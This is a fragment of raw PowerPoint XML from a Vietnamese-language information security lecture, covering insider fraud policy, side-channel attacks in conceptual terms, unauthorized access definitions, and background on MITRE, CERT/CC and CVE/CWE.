            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>xuyên</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>và</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>đầy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>đủ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFontTx/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Sự</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>lừa</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>đảo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>và</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>trộn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>cắp:cả</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>các</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>nhân</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>viên</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>trong</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tổ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>và</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>bên</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ngoài</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Một</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>giải</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>pháp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>để</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>chống</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>lại</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sự</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>gian</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>lận</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>và</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>trộm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>cắp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>bởi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>những</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>nhân</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>viên</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>trong</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>nội</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>bộ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tổ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>chức</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>thì</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>phải</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>có</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>một</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>chính</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sách</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>rõ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ràng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>và</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>đầy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>đủ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="30137439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lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>Như các thiết bị điện, các thành phần của 1 máy tính thường tạo ra các bức xạ điện từ, kẻ tấn công sẽ quan sát những bức xạ điện từ phát ra và có thể hiểu được mối quan hệ giữa quá trình tính toán và dữ liệu, từ đó có thể suy ra thông tin về tính toán và dữ liệu.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" b="0" i="0" kern="1200" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
              <a:cs typeface="+mn-cs"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>Ngoài thời gian hoạt động và lỗi, năng lượng tiêu thụ của một thiết bị mật mã có thể cung cấp nhiều thông tin về các hoạt động và các thông số của hệ thống. Tấn công phân tích năng lượng chỉ có thể áp dụng vào triển khai phần cứng của hệ thống mật mã. Loại tấn công này thực sự hiệu quả và đã được chứng minh khi tấn công thành công thẻ thông minh hoặc các hệ thống chuyên dụng lưu trữ khóa bí mật.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{18F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>21</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4791998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spect="1" noTextEdit="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="457200" y="720725"/>
            <a:ext cx="6400800" cy="360045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29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da-DK" dirty="0"/>
              <a:t>- giải mật</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="da-DK" baseline="0" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="da-DK" dirty="0"/>
              <a:t>thông tin được hiểu là sự cung cấp thông tin trái phép tới người dùng mà người đó không có quyền tiếp cận tới thông tin được bảo vệ</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="da-DK" dirty="0"/>
              <a:t>- tiếp cận trái phép là sự thu được thông tin bảo vệ bởi chủ thể mong muốn kèm theo sự phá vỡ các luật lệ và các điều luật được quy định bởi các văn bản pháp lý hoặc bởi chủ sở hữu thông tin trong tiếp cận tới thông tin được bảo vệ. ở đây chủ thể mong muốn thực hiện tiếp cận trái phép tới thông tin có thể là một nhà nước, một pháp nhân, một nhóm người, trong số đó có các tổ chức xã hội và các cá nhân.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="da-DK" dirty="0"/>
              <a:t>- Thu thập thông tin bảo vệ bằng tình báo có thể thực hiện bằng các thiết bị kỹ thuật (tình báo kỹ thuật) hoặc bằng các nhân viên tình báo (điệp viên).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="42050326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 sánh CVE, CWE</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{18F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>27</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="30445364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 sánh CVE, CWE</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{18F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>28</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="25235120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a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>The Mitre Corporation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> (stylized as </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>The MITRE Corporation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>MITRE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>) is an American </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" i="0" u="none" strike="noStrike" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
                <a:hlinkClick r:id="rId3" tooltip="Not-for-profit"/>
              </a:rPr>
              <a:t>not-for-profit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> organization based in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" i="0" u="none" strike="noStrike" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
                <a:hlinkClick r:id="rId4" tooltip="Bedford, Massachusetts"/>
              </a:rPr>
              <a:t>Bedford, Massachusetts</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>, and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" i="0" u="none" strike="noStrike" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
                <a:hlinkClick r:id="rId5" tooltip="McLean, Virginia"/>
              </a:rPr>
              <a:t>McLean, Virginia</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>. It manages </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" i="0" u="none" strike="noStrike" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
                <a:hlinkClick r:id="rId6" tooltip="Federally funded research and development centers"/>
              </a:rPr>
              <a:t>federally funded research and development centers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> (FFRDCs) supporting several U.S. government agencies.</a:t>
            </a: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The </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>CERT Coordination Center</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>CERT/CC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>) is the coordination center of the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" i="0" u="none" strike="noStrike" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
                <a:hlinkClick r:id="rId7" tooltip="Computer emergency response team"/>
              </a:rPr>
              <a:t>computer emergency response team</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> (CERT) for the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" i="0" u="none" strike="noStrike" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
                <a:hlinkClick r:id="rId8" tooltip="Software Engineering Institute"/>
              </a:rPr>
              <a:t>Software Engineering Institute</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> (SEI), a non-profit United States </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" i="0" u="none" strike="noStrike" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
                <a:hlinkClick r:id="rId9" tooltip="Federally funded research and development center"/>
              </a:rPr>
              <a:t>federally funded research and development center</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>. The CERT/CC researches software bugs that impact software and internet security, publishes research and information on its findings, and works with business and government to improve security of software and the internet as a whole.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{18F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>29</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3571265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a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E84C4D02-1EA2-4102-90EF-8AE9095E359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a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D63954FC-2B71-47B3-A56B-A7FC5FFD68E2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" sz="1100" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
